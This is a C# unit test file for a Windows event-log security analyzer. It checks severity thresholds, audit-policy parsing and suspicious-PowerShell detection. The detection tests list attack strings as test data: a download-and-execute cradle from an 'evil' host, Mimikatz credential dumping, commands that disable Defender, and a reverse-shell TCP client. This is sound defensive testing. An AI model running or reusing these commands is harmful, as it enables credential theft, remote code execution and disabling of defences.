using WinSentinel.Core.Audits;
using WinSentinel.Core.Models;

namespace WinSentinel.Tests.Audits;

/// <summary>
/// Unit tests for <see cref="EventLogAnalyzer"/> - the pure, I/O-free decision logic
/// behind the <see cref="EventLogAudit"/> module. The audit module owns all Windows
/// Event Log / auditpol / registry collection; this analyzer owns every security
/// classification (failed-login thresholds, audit-policy gap parsing, suspicious
/// PowerShell matching, Defender / system-error / service-install severity, Security
/// log sizing + retention, and audit-log-cleared detection).
///
/// All tests are deterministic and exercise the security-relevant logic directly,
/// without reading the live Security log, running auditpol, or touching the registry.
/// Mirrors <see cref="ProcessLineageAnalyzerTests"/>.
/// </summary>
public class EventLogAnalyzerTests
{
    // ----------------------------------------------------------------------
    // Account / user / IP helpers
    // ----------------------------------------------------------------------

    [Theory]
    [InlineData("SYSTEM")]
    [InlineData("system")]            // case-insensitive
    [InlineData("LOCAL SERVICE")]
    [InlineData("NETWORK SERVICE")]
    [InlineData("ANONYMOUS LOGON")]
    [InlineData("Window Manager")]
    [InlineData("DESKTOP-ABC$")]      // machine account (ends with $)
    [InlineData(null)]                // null treated as system (skip)
    [InlineData("")]                  // blank treated as system (skip)
    [InlineData("   ")]
    public void IsSystemAccount_SystemMachineAndBlank_ReturnTrue(string? account)
    {
        Assert.True(EventLogAnalyzer.IsSystemAccount(account));
    }

    [Theory]
    [InlineData("alice")]
    [InlineData("Administrator")]
    [InlineData("svc-backup")]
    public void IsSystemAccount_RealUsers_ReturnFalse(string account)
    {
        Assert.False(EventLogAnalyzer.IsSystemAccount(account));
    }

    [Theory]
    [InlineData("alice", true)]
    [InlineData("-", false)]
    [InlineData(null, false)]
    [InlineData("", false)]
    [InlineData("  ", false)]
    public void IsMeaningfulUser_SkipsDashAndBlank(string? user, bool expected)
    {
        Assert.Equal(expected, EventLogAnalyzer.IsMeaningfulUser(user));
    }

    [Theory]
    [InlineData("203.0.113.5", true)]
    [InlineData("::1", false)]        // loopback noise
    [InlineData("127.0.0.1", false)]  // loopback noise
    [InlineData("-", false)]
    [InlineData(null, false)]
    [InlineData("", false)]
    public void IsMeaningfulSourceIp_SkipsLoopbackAndBlank(string? ip, bool expected)
    {
        Assert.Equal(expected, EventLogAnalyzer.IsMeaningfulSourceIp(ip));
    }

    // ----------------------------------------------------------------------
    // Truncate
    // ----------------------------------------------------------------------

    [Fact]
    public void Truncate_ShorterThanMax_Unchanged()
    {
        Assert.Equal("short", EventLogAnalyzer.Truncate("short", 100));
    }

    [Fact]
    public void Truncate_LongerThanMax_AppendsEllipsis()
    {
        var result = EventLogAnalyzer.Truncate(new string('x', 200), 150);
        Assert.Equal(153, result.Length);            // 150 + "..."
        Assert.EndsWith("...", result);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    public void Truncate_NullOrEmpty_ReturnsEmpty(string? value)
    {
        Assert.Equal(string.Empty, EventLogAnalyzer.Truncate(value, 10));
    }

    // ----------------------------------------------------------------------
    // RankTopCounts
    // ----------------------------------------------------------------------

    [Fact]
    public void RankTopCounts_OrdersByDescendingCount_AndFormats()
    {
        var counts = new Dictionary<string, int>
        {
            ["alice"] = 2,
            ["bob"] = 9,
            ["carol"] = 5,
        };
        var ranked = EventLogAnalyzer.RankTopCounts(counts);
        Assert.Equal(3, ranked.Count);
        Assert.Equal("bob (9x)", ranked[0]);
        Assert.Equal("carol (5x)", ranked[1]);
        Assert.Equal("alice (2x)", ranked[2]);
    }

    [Fact]
    public void RankTopCounts_RespectsTakeLimit()
    {
        var counts = Enumerable.Range(1, 20).ToDictionary(i => $"u{i}", i => i);
        var ranked = EventLogAnalyzer.RankTopCounts(counts, take: 3);
        Assert.Equal(3, ranked.Count);
        Assert.Equal("u20 (20x)", ranked[0]);
    }

    [Fact]
    public void RankTopCounts_Empty_ReturnsEmpty()
    {
        Assert.Empty(EventLogAnalyzer.RankTopCounts(new Dictionary<string, int>()));
    }

    [Fact]
    public void RankTopCounts_TiedCounts_BreakTiesByOrdinalKey()
    {
        // Every key shares the same count, so ordering is decided entirely by the
        // tie-break. Insertion order here is deliberately scrambled to prove the
        // result does not depend on dictionary enumeration order.
        var counts = new Dictionary<string, int>
        {
            ["charlie"] = 3,
            ["alice"] = 3,
            ["bob"] = 3,
        };
        var ranked = EventLogAnalyzer.RankTopCounts(counts);
        Assert.Equal(new[] { "alice (3x)", "bob (3x)", "charlie (3x)" }, ranked);
    }

    [Fact]
    public void RankTopCounts_CountTakesPrecedenceOverKey()
    {
        // Count is the primary key: a higher count always outranks an
        // alphabetically-earlier name. "zeta" (10) must precede "alpha" (2).
        var counts = new Dictionary<string, int>
        {
            ["alpha"] = 2,
            ["zeta"] = 10,
            ["mike"] = 2,
        };
        var ranked = EventLogAnalyzer.RankTopCounts(counts);
        Assert.Equal(new[] { "zeta (10x)", "alpha (2x)", "mike (2x)" }, ranked);
    }

    [Fact]
    public void RankTopCounts_TiedAtCutoff_SelectsDeterministicSubset()
    {
        // 8 entries tied at count 1, take=3: WHICH three survive the cut must be
        // deterministic (the ordinal-lowest three), not an arbitrary slice of the
        // dictionary. Build the dictionary in reverse order to make a naive
        // "first three enumerated" implementation visibly wrong.
        var counts = new Dictionary<string, int>();
        foreach (var name in new[] { "h", "g", "f", "e", "d", "c", "b", "a" })
            counts[name] = 1;
        var ranked = EventLogAnalyzer.RankTopCounts(counts, take: 3);
        Assert.Equal(new[] { "a (1x)", "b (1x)", "c (1x)" }, ranked);
    }

    [Fact]
    public void RankTopCounts_IsStableAcrossDifferentInsertionOrders()
    {
        // Same data, two different insertion orders -> identical ranked output.
        // This is the property that prevents phantom diffs between two scans.
        var forward = new Dictionary<string, int>
        {
            ["10.0.0.1"] = 4,
            ["10.0.0.2"] = 4,
            ["10.0.0.3"] = 7,
            ["10.0.0.4"] = 1,
        };
        var reverse = new Dictionary<string, int>
        {
            ["10.0.0.4"] = 1,
            ["10.0.0.3"] = 7,
            ["10.0.0.2"] = 4,
            ["10.0.0.1"] = 4,
        };
        Assert.Equal(
            EventLogAnalyzer.RankTopCounts(forward),
            EventLogAnalyzer.RankTopCounts(reverse));
    }

    // ----------------------------------------------------------------------
    // IsSuspiciousPowerShell
    // ----------------------------------------------------------------------

    [Theory]
    [InlineData("IEX (New-Object Net.WebClient).DownloadString('http://evil')")]
    [InlineData("powershell -enc SQBFAFgA")]
    [InlineData("Invoke-Expression $payload")]
    [InlineData("Invoke-Mimikatz -DumpCreds")]
    [InlineData("[Convert]::FromBase64String($x)")]
    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $true")]
    [InlineData("Add-MpPreference -ExclusionPath C:\\temp")]
    [InlineData("New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)")]
    [InlineData("-ExecutionPolicy bypass -WindowStyle hidden")]
    public void IsSuspiciousPowerShell_KnownAttackPatterns_ReturnTrue(string script)
    {
        Assert.True(EventLogAnalyzer.IsSuspiciousPowerShell(script));
    }

    [Theory]
    [InlineData("Get-Process | Sort-Object CPU")]
    [InlineData("Write-Host 'hello world'")]
    [InlineData("Get-ChildItem -Path C:\\")]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void IsSuspiciousPowerShell_BenignOrEmpty_ReturnFalse(string? script)
    {
        Assert.False(EventLogAnalyzer.IsSuspiciousPowerShell(script));
    }

    [Fact]
    public void IsSuspiciousPowerShell_IsCaseInsensitive()
    {
        Assert.True(EventLogAnalyzer.IsSuspiciousPowerShell("invoke-expression $x"));
        Assert.True(EventLogAnalyzer.IsSuspiciousPowerShell("DOWNLOADSTRING"));
    }

    // ----------------------------------------------------------------------
    // Failed logins (4625)
    // ----------------------------------------------------------------------

    [Fact]
    public void BuildFailedLoginFinding_Zero_IsPass()
    {
        var f = EventLogAnalyzer.BuildFailedLoginFinding(0);
        Assert.Equal(Severity.Pass, f.Severity);
        Assert.Equal(EventLogAnalyzer.Category, f.Category);
    }

    [Fact]
    public void BuildFailedLoginFinding_SmallCount_IsInfo()
    {
        var f = EventLogAnalyzer.BuildFailedLoginFinding(3);
        Assert.Equal(Severity.Info, f.Severity);
        Assert.Contains("3", f.Title);
    }

    [Theory]
    [InlineData(6)]
    [InlineData(20)]   // boundary: >5 and not >20 => Warning
    public void BuildFailedLoginFinding_ModerateCount_IsWarning(int count)
    {
        var f = EventLogAnalyzer.BuildFailedLoginFinding(count);
        Assert.Equal(Severity.Warning, f.Severity);
    }

    [Theory]
    [InlineData(21)]
    [InlineData(500)]
    public void BuildFailedLoginFinding_HighCount_IsCritical(int count)
    {
        var f = EventLogAnalyzer.BuildFailedLoginFinding(count);
        Assert.Equal(Severity.Critical, f.Severity);
        Assert.NotNull(f.FixCommand);
    }

    [Fact]
    public void BuildFailedLoginFinding_IncludesTopUsersAndIps()
    {
        var f = EventLogAnalyzer.BuildFailedLoginFinding(
            30,
            new[] { "administrator (12x)" },
            new[] { "203.0.113.9 (12x)" });
        Assert.Contains("administrator (12x)", f.Description);
        Assert.Contains("203.0.113.9 (12x)", f.Description);
    }

    [Fact]
    public void BuildFailedLoginFinding_BoundaryThresholds_Exact()
    {
        // exactly 20 is NOT > 20, so Warning, not Critical
        Assert.Equal(Severity.Warning, EventLogAnalyzer.BuildFailedLoginFinding(20).Severity);
        // exactly 5 is NOT > 5, so Info
        Assert.Equal(Severity.Info, EventLogAnalyzer.BuildFailedLoginFinding(5).Severity);
    }

    // ----------------------------------------------------------------------
    // Account lockouts (4740)
    // ----------------------------------------------------------------------

    [Fact]
    public void BuildAccountLockoutFinding_Zero_IsPass()
    {
        Assert.Equal(Severity.Pass, EventLogAnalyzer.BuildAccountLockoutFinding(0).Severity);
    }

    [Theory]
    [InlineData(1)]
    [InlineData(5)]   // boundary: not >5 => Info
    public void BuildAccountLockoutFinding_Low_IsInfo(int count)
    {
        Assert.Equal(Severity.Info, EventLogAnalyzer.BuildAccountLockoutFinding(count).Severity);
    }

    [Theory]
    [InlineData(6)]
    [InlineData(50)]
    public void BuildAccountLockoutFinding_High_IsWarning(int count)
    {
        Assert.Equal(Severity.Warning, EventLogAnalyzer.BuildAccountLockoutFinding(count).Severity);
    }

    [Fact]
    public void BuildAccountLockoutFinding_IncludesAccounts()
    {
        var f = EventLogAnalyzer.BuildAccountLockoutFinding(8, new[] { "jdoe (4x)" });
        Assert.Contains("jdoe (4x)", f.Description);
    }

    // ----------------------------------------------------------------------
    // Privilege escalation (4672/4673)
    // ----------------------------------------------------------------------

    [Fact]
    public void BuildPrivilegeEscalationFinding_NoEvents_IsInfo_WithAuditHint()
    {
        var f = EventLogAnalyzer.BuildPrivilegeEscalationFinding(0, 0);
        Assert.Equal(Severity.Info, f.Severity);
        Assert.Contains("audit", f.Description, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void BuildPrivilegeEscalationFinding_NormalVolume_IsPass()
    {
        var f = EventLogAnalyzer.BuildPrivilegeEscalationFinding(5, 10, distinctPrivilegedUsers: 2);
        Assert.Equal(Severity.Pass, f.Severity);
    }

    [Fact]
    public void BuildPrivilegeEscalationFinding_TooManyDistinctUsers_IsWarning()
    {
        var f = EventLogAnalyzer.BuildPrivilegeEscalationFinding(5, 5, distinctPrivilegedUsers: 11);
        Assert.Equal(Severity.Warning, f.Severity);
    }

    [Fact]
    public void BuildPrivilegeEscalationFinding_TooManyServiceCalls_IsWarning()
    {
        var f = EventLogAnalyzer.BuildPrivilegeEscalationFinding(5, 51, distinctPrivilegedUsers: 1);
        Assert.Equal(Severity.Warning, f.Severity);
    }

    [Fact]
    public void BuildPrivilegeEscalationFinding_BoundaryValues_StayPass()
    {
        // distinct == 10 (not >10) and 4673 == 50 (not >50) => Pass
        var f = EventLogAnalyzer.BuildPrivilegeEscalationFinding(1, 50, distinctPrivilegedUsers: 10);
        Assert.Equal(Severity.Pass, f.Severity);
    }

    // ----------------------------------------------------------------------
    // Audit policy parsing + classification
    // ----------------------------------------------------------------------

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void ParseAuditPolicy_EmptyInput_ReturnsNull(string? input)
    {
        Assert.Null(EventLogAnalyzer.ParseAuditPolicy(input));
    }

    [Fact]
    public void ParseAuditPolicy_AccessDenied_ReturnsNull()
    {
        Assert.Null(EventLogAnalyzer.ParseAuditPolicy("Error 0x00000005 occurred: Access is denied"));
    }

    [Fact]
    public void ParseAuditPolicy_AllEnabled_NoGaps()
    {
        // Every required subcategory present with a non-"No Auditing" setting.
        var lines = new[]
        {
            "Logon                    Success and Failure",
            "Logoff                   Success",
            "Account Lockout          Failure",
            "Special Logon            Success",
            "File System              Success and Failure",
            "Registry                 Success",
            "Sensitive Privilege Use  Success and Failure",
            "Authentication Policy Change  Success",
            "Audit Policy Change      Success",
            "User Account Management  Success and Failure",
            "Security Group Management Success",
            "Computer Account Management Success",
        };
        var scan = EventLogAnalyzer.ParseAuditPolicy(string.Join("\n", lines));
        Assert.NotNull(scan);
        Assert.Empty(scan!.Gaps);
        Assert.Equal(Severity.Pass, EventLogAnalyzer.BuildAuditPolicyFinding(scan).Severity);
    }

    [Fact]
    public void ParseAuditPolicy_FewGaps_IsWarning_WithFixCommand()
    {
        var lines = new[]
        {
            "Logon                    No Auditing",
            "Logoff                   Success",
            "Account Lockout          No Auditing",
        };
        var scan = EventLogAnalyzer.ParseAuditPolicy(string.Join("\n", lines));
        Assert.NotNull(scan);
        Assert.Equal(2, scan!.Gaps.Count);
        var f = EventLogAnalyzer.BuildAuditPolicyFinding(scan);
        Assert.Equal(Severity.Warning, f.Severity);
        Assert.NotNull(f.FixCommand);
        Assert.Contains("auditpol", f.FixCommand!);
    }

    [Fact]
    public void ParseAuditPolicy_ManyGaps_IsCritical()
    {
        // 4 "No Auditing" subcategories => > 3 => Critical
        var lines = new[]
        {
            "Logon                    No Auditing",
            "Logoff                   No Auditing",
            "Account Lockout          No Auditing",
            "Special Logon            No Auditing",
        };
        var scan = EventLogAnalyzer.ParseAuditPolicy(string.Join("\n", lines));
        Assert.NotNull(scan);
        Assert.Equal(4, scan!.Gaps.Count);
        Assert.Equal(Severity.Critical, EventLogAnalyzer.BuildAuditPolicyFinding(scan).Severity);
    }

    [Fact]
    public void ParseAuditPolicy_GapNamesIncludeParentCategory()
    {
        var scan = EventLogAnalyzer.ParseAuditPolicy("Logon                    No Auditing");
        Assert.NotNull(scan);
        Assert.Contains("Logon (Logon/Logoff)", scan!.Gaps);
    }

    [Fact]
    public void ParseAuditPolicy_SpecialLogonBeforeLogon_DoesNotMisattributeLogon()
    {
        // Regression: "Logon" is a substring of "Special Logon". A loose Contains
        // match would bind the "Logon" subcategory to whichever such line appears
        // first. Here "Special Logon" is listed first and is disabled, while the
        // real "Logon" subcategory is fully enabled — "Logon" must NOT be reported
        // as a gap, and "Special Logon" must be the only collision-affected gap.
        var lines = new[]
        {
            "Special Logon            No Auditing",
            "Logon                    Success and Failure",
            "Logoff                   Success and Failure",
            "Account Lockout          Success and Failure",
        };
        var scan = EventLogAnalyzer.ParseAuditPolicy(string.Join("\n", lines));
        Assert.NotNull(scan);
        Assert.DoesNotContain("Logon (Logon/Logoff)", scan!.Gaps);
        Assert.Contains("Special Logon (Logon/Logoff)", scan.Gaps);
        Assert.Contains("Logon", scan.Enabled);          // the real Logon line, enabled
        Assert.DoesNotContain("Special Logon", scan.Enabled);
    }

    [Fact]
    public void ParseAuditPolicy_SpecialLogonGap_DoesNotAlsoFlagLogon()
    {
        // When ONLY "Special Logon" is present and disabled (no "Logon" line at all),
        // the loose match used to manufacture a phantom "Logon" gap off the
        // "Special Logon" line. With token-anchored matching, "Logon" is simply
        // absent (skipped), and the sole gap is "Special Logon".
        var scan = EventLogAnalyzer.ParseAuditPolicy("Special Logon            No Auditing");
        Assert.NotNull(scan);
        Assert.Contains("Special Logon (Logon/Logoff)", scan!.Gaps);
        Assert.DoesNotContain("Logon (Logon/Logoff)", scan.Gaps);
        Assert.Single(scan.Gaps);
    }

    [Theory]
    [InlineData("Logon                    Success and Failure", "Logon", true)]
    [InlineData("Logon", "Logon", true)]                         // bare name, no setting column
    [InlineData("Special Logon            No Auditing", "Logon", false)] // collision rejected
    [InlineData("Logon/Logoff", "Logon", false)]                 // category header, not bounded
    [InlineData("logon  Success", "Logon", true)]                // case-insensitive (pre-trimmed)
    [InlineData("", "Logon", false)]
    public void LineStartsWithSubcategory_AnchorsToWholeToken(string line, string sub, bool expected)
    {
        Assert.Equal(expected, EventLogAnalyzer.LineStartsWithSubcategory(line, sub));
    }

    // ----------------------------------------------------------------------
    // Service installs (7045)
    // ----------------------------------------------------------------------

    [Fact]
    public void BuildServiceInstallFinding_Zero_IsPass()
    {
        Assert.Equal(Severity.Pass, EventLogAnalyzer.BuildServiceInstallFinding(0).Severity);
    }

    [Theory]
    [InlineData(1)]
    [InlineData(5)]   // boundary: not >5 => Info
    public void BuildServiceInstallFinding_Few_IsInfo(int count)
    {
        Assert.Equal(Severity.Info, EventLogAnalyzer.BuildServiceInstallFinding(count).Severity);
    }

    [Theory]
    [InlineData(6)]
    [InlineData(40)]
    public void BuildServiceInstallFinding_Many_IsWarning(int count)
    {
        Assert.Equal(Severity.Warning, EventLogAnalyzer.BuildServiceInstallFinding(count).Severity);
    }

    [Fact]
    public void BuildServiceInstallFinding_OverflowSummary_ShowsRemainder()
    {
        var lines = Enumerable.Range(1, 12).Select(i => $"svc{i}").ToList();
        var f = EventLogAnalyzer.BuildServiceInstallFinding(12, lines);
        Assert.Contains("and 2 more", f.Description);
    }

    // ----------------------------------------------------------------------
    // Suspicious PowerShell findings (4104)
    // ----------------------------------------------------------------------

    [Fact]
    public void BuildSuspiciousPowerShellFinding_None_IsPass()
    {
        var f = EventLogAnalyzer.BuildSuspiciousPowerShellFinding(0, 42);
        Assert.Equal(Severity.Pass, f.Severity);
        Assert.Contains("42", f.Description);
    }

    [Theory]
    [InlineData(1)]
    [InlineData(5)]   // boundary: not >5 => Warning
    public void BuildSuspiciousPowerShellFinding_Few_IsWarning(int count)
    {
        Assert.Equal(Severity.Warning,
            EventLogAnalyzer.BuildSuspiciousPowerShellFinding(count, 100).Severity);
    }

    [Theory]
    [InlineData(6)]
    [InlineData(50)]
    public void BuildSuspiciousPowerShellFinding_Many_IsCritical(int count)
    {
        Assert.Equal(Severity.Critical,
            EventLogAnalyzer.BuildSuspiciousPowerShellFinding(count, 100).Severity);
    }

    [Fact]
    public void BuildSuspiciousPowerShellFinding_IncludesExamples()
    {
        var f = EventLogAnalyzer.BuildSuspiciousPowerShellFinding(2, 10, new[] { "EXAMPLE-CMD" });
        Assert.Contains("EXAMPLE-CMD", f.Description);
    }

    [Fact]
    public void BuildScriptBlockLoggingDisabledFinding_IsWarning_WithRegistryFix()
    {
        var f = EventLogAnalyzer.BuildScriptBlockLoggingDisabledFinding();
        Assert.Equal(Severity.Warning, f.Severity);
        Assert.NotNull(f.FixCommand);
        Assert.Contains("ScriptBlockLogging", f.FixCommand!);
    }

    // ----------------------------------------------------------------------
    // Defender detections (1116/1117)
    // ----------------------------------------------------------------------

    [Fact]
    public void BuildDefenderDetectionFinding_None_IsPass()
    {
        Assert.Equal(Severity.Pass, EventLogAnalyzer.BuildDefenderDetectionFinding(0, 0).Severity);
    }

    [Fact]
    public void BuildDefenderDetectionFinding_AllRemediated_IsWarning()
    {
        // detections == actions => all handled => Warning
        var f = EventLogAnalyzer.BuildDefenderDetectionFinding(3, 3);
        Assert.Equal(Severity.Warning, f.Severity);
        Assert.NotNull(f.FixCommand);
    }

    [Fact]
    public void BuildDefenderDetectionFinding_Unresolved_IsCritical()
    {
        // detections > actions => some unresolved => Critical
        var f = EventLogAnalyzer.BuildDefenderDetectionFinding(5, 2);
        Assert.Equal(Severity.Critical, f.Severity);
        Assert.Contains("Unresolved", f.Title);
    }

    [Fact]
    public void BuildDefenderDetectionFinding_IncludesThreatNames()
    {
        var f = EventLogAnalyzer.BuildDefenderDetectionFinding(1, 1, new[] { "Trojan:Win32/Test" });
        Assert.Contains("Trojan:Win32/Test", f.Description);
    }

    // ----------------------------------------------------------------------
    // System errors (System log Level 1/2)
    // ----------------------------------------------------------------------

    [Fact]
    public void BuildSystemErrorFinding_None_IsPass()
    {
        Assert.Equal(Severity.Pass, EventLogAnalyzer.BuildSystemErrorFinding(0, 0).Severity);
    }

    [Fact]
    public void BuildSystemErrorFinding_AnyCritical_IsWarning_WithSfcFix()
    {
        var f = EventLogAnalyzer.BuildSystemErrorFinding(1, 0);
        Assert.Equal(Severity.Warning, f.Severity);
        Assert.NotNull(f.FixCommand);
        Assert.Contains("sfc", f.FixCommand!);
    }

    [Fact]
    public void BuildSystemErrorFinding_HighErrorRate_NoCritical_IsWarning()
    {
        // errorCount > 20, no criticals
        var f = EventLogAnalyzer.BuildSystemErrorFinding(0, 21);
        Assert.Equal(Severity.Warning, f.Severity);
    }

    [Theory]
    [InlineData(1)]
    [InlineData(20)]   // boundary: not >20 => Info
    public void BuildSystemErrorFinding_LowErrorRate_NoCritical_IsInfo(int errors)
    {
        var f = EventLogAnalyzer.BuildSystemErrorFinding(0, errors);
        Assert.Equal(Severity.Info, f.Severity);
    }

    [Fact]
    public void BuildSystemErrorFinding_IncludesSourcesAndSamples()
    {
        var f = EventLogAnalyzer.BuildSystemErrorFinding(
            0, 5,
            new[] { "disk (3x)" },
            new[] { "sample-line" });
        Assert.Contains("disk (3x)", f.Description);
        Assert.Contains("sample-line", f.Description);
    }

    // ----------------------------------------------------------------------
    // Security log size + retention
    // ----------------------------------------------------------------------

    [Theory]
    [InlineData(0, "Overwrite as needed (default)")]
    [InlineData(-1, "Do not overwrite (archive/manual clear)")]
    [InlineData(30, "Overwrite events older than 30 days")]
    public void DescribeRetentionMode_MapsSentinels(int retention, string expected)
    {
        Assert.Equal(expected, EventLogAnalyzer.DescribeRetentionMode(retention));
    }

    [Fact]
    public void BuildSecurityLogSizeFinding_BelowMinimum_IsCritical()
    {
        // 32 MB < 64 MB minimum => Critical
        var f = EventLogAnalyzer.BuildSecurityLogSizeFinding(32L * 1024 * 1024, 0);
        Assert.Equal(Severity.Critical, f.Severity);
        Assert.NotNull(f.FixCommand);
    }

    [Fact]
    public void BuildSecurityLogSizeFinding_BetweenMinAndRecommended_IsWarning()
    {
        // 100 MB: >= 64 MB but < 128 MB => Warning
        var f = EventLogAnalyzer.BuildSecurityLogSizeFinding(100L * 1024 * 1024, 0);
        Assert.Equal(Severity.Warning, f.Severity);
    }

    [Fact]
    public void BuildSecurityLogSizeFinding_AtOrAboveRecommended_IsPass()
    {
        // exactly 128 MB (recommended) => Pass
        var f = EventLogAnalyzer.BuildSecurityLogSizeFinding(128L * 1024 * 1024, 0);
        Assert.Equal(Severity.Pass, f.Severity);
    }

    [Fact]
    public void BuildSecurityLogSizeFinding_UnknownSize_AssumesDefault_IsCritical()
    {
        // 0 => assume 20 MB default => below minimum => Critical
        var f = EventLogAnalyzer.BuildSecurityLogSizeFinding(0, 0);
        Assert.Equal(Severity.Critical, f.Severity);
    }

    [Fact]
    public void BuildSecurityLogSizeFinding_DescribesOverwriteMode()
    {
        var f = EventLogAnalyzer.BuildSecurityLogSizeFinding(256L * 1024 * 1024, -1);
        Assert.Contains("Do not overwrite", f.Description);
    }

    [Fact]
    public void BuildDoNotOverwriteFinding_OnlyWhenRetentionNegativeOne()
    {
        Assert.Null(EventLogAnalyzer.BuildDoNotOverwriteFinding(0));
        Assert.Null(EventLogAnalyzer.BuildDoNotOverwriteFinding(30));
        var f = EventLogAnalyzer.BuildDoNotOverwriteFinding(-1);
        Assert.NotNull(f);
        Assert.Equal(Severity.Warning, f!.Severity);
    }

    [Theory]
    [InlineData("MaximumSizeInBytes : 134217728", 134217728L)]
    [InlineData("  MaximumSizeInBytes :   20971520  ", 20971520L)]
    [InlineData("no size here", 0L)]
    [InlineData(null, 0L)]
    [InlineData("", 0L)]
    public void ParseMaxSizeFromPowerShell_ExtractsBytes(string? psOutput, long expected)
    {
        Assert.Equal(expected, EventLogAnalyzer.ParseMaxSizeFromPowerShell(psOutput));
    }

    [Theory]
    [InlineData("LogMode : Retain", -1)]
    [InlineData("LogMode : Circular", 0)]
    [InlineData("LogMode : AutoBackup", 7)]   // unknown mode => fallback
    [InlineData("no mode", 7)]                 // no match => fallback
    [InlineData(null, 7)]
    public void ParseRetentionFromLogMode_MapsModes(string? psOutput, int expected)
    {
        Assert.Equal(expected, EventLogAnalyzer.ParseRetentionFromLogMode(psOutput, fallback: 7));
    }

    // ----------------------------------------------------------------------
    // Audit log cleared (1102)
    // ----------------------------------------------------------------------

    [Fact]
    public void BuildLogClearedFinding_Zero_IsPass()
    {
        Assert.Equal(Severity.Pass, EventLogAnalyzer.BuildLogClearedFinding(0).Severity);
    }

    [Theory]
    [InlineData(1)]
    [InlineData(7)]
    public void BuildLogClearedFinding_AnyClear_IsCritical(int count)
    {
        var f = EventLogAnalyzer.BuildLogClearedFinding(count, new[] { "2026-06-10 by admin" });
        Assert.Equal(Severity.Critical, f.Severity);
        Assert.Contains("2026-06-10 by admin", f.Description);
    }

    // ----------------------------------------------------------------------
    // Cross-cutting invariants
    // ----------------------------------------------------------------------

    [Fact]
    public void AllBuilders_UseEventLogsCategory()
    {
        var findings = new[]
        {
            EventLogAnalyzer.BuildFailedLoginFinding(0),
            EventLogAnalyzer.BuildFailedLoginFinding(99),
            EventLogAnalyzer.BuildAccountLockoutFinding(0),
            EventLogAnalyzer.BuildAccountLockoutFinding(99),
            EventLogAnalyzer.BuildPrivilegeEscalationFinding(0, 0),
            EventLogAnalyzer.BuildPrivilegeEscalationFinding(1, 99, distinctPrivilegedUsers: 99),
            EventLogAnalyzer.BuildServiceInstallFinding(0),
            EventLogAnalyzer.BuildServiceInstallFinding(99),
            EventLogAnalyzer.BuildSuspiciousPowerShellFinding(0, 0),
            EventLogAnalyzer.BuildSuspiciousPowerShellFinding(99, 100),
            EventLogAnalyzer.BuildScriptBlockLoggingDisabledFinding(),
            EventLogAnalyzer.BuildDefenderDetectionFinding(0, 0),
            EventLogAnalyzer.BuildDefenderDetectionFinding(9, 1),
            EventLogAnalyzer.BuildSystemErrorFinding(0, 0),
            EventLogAnalyzer.BuildSystemErrorFinding(5, 99),
            EventLogAnalyzer.BuildSecurityLogSizeFinding(0, 0),
            EventLogAnalyzer.BuildSecurityLogSizeFinding(999L * 1024 * 1024, 0),
            EventLogAnalyzer.BuildLogClearedFinding(0),
            EventLogAnalyzer.BuildLogClearedFinding(3),
        };

        Assert.All(findings, f =>
        {
            Assert.Equal("Event Logs", f.Category);
            Assert.False(string.IsNullOrWhiteSpace(f.Title));
            Assert.False(string.IsNullOrWhiteSpace(f.Description));
        });
    }
}
